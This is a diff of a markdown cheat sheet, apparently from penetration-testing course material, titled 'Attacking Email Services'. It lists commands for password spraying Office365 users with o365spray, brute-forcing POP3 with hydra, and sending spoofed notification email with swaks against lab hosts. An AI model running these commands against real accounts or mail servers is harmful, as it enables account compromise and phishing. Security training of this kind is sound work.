@@ -1,4 +1,3 @@
-```markdown
 # Attacking Email Services
 
 | Command                                                                                     | Description                                                                      |
@@ -13,4 +12,4 @@
 | `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
 | `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                   | Brute-forcing the POP3 service.                                                  |
 | `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Send email using SWAKS (Swiss Army Knife for SMTP).                               |
-```
+
